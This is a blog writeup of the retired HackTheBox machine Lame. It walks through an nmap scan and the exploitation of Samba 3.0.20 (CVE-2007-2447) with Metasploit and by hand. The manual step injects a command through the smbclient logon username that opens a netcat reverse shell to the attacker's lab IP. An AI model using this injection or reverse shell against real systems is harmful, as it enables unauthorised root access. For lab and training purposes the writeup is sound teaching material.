---
title: "Lame - HackTheBox"
description: "Writeup for the Lame machine from HackTheBox, an easy Linux machine perfect for beginners."
pubDate: 2026-10-09
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
lang: en
tags: ["samba", "vsftpd", "metasploit"]
retired: true
logo: "/images/writeups/htb/lame/logo.png"
heroImage: "/images/writeups/htb/lame/cover.png"
---

# Lame - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox

## Reconnaissance

We start with an Nmap scan:

```bash
nmap -sC -sV -oA lame 10.10.10.3
```

**Open ports:**
- 21/tcp (FTP - vsftpd 2.3.4)
- 22/tcp (SSH - OpenSSH 4.7p1)
- 139/tcp (Netbios-ssn - Samba 3.0.20)
- 445/tcp (Netbios-ssn - Samba 3.0.20)

## Enumeration

### FTP - vsftpd 2.3.4

This version has a known backdoor vulnerability, but it didn't work in this case.

### Samba 3.0.20

Samba 3.0.20 is vulnerable to **CVE-2007-2447** (username map script).

## Exploitation

### Exploit with Metasploit

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
exploit
```

### Manual Exploit

We can also exploit manually:

```bash
smbclient //10.10.10.3/tmp
logon "./=`nohup nc -e /bin/bash 10.10.14.5 4444`"
```

In another terminal we listen:

```bash
nc -lvnp 4444
```

## Post-Exploitation

We get a shell as **root** directly.

**User flag:**
```bash
cat /home/makis/user.txt
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusion

Lame is an excellent machine for beginners that demonstrates the importance of keeping software updated. The Samba vulnerability is a classic that every pentester should know.

**Lessons learned:**
- Always check software versions
- Samba 3.0.20 has a critical vulnerability
- Thorough enumeration is key
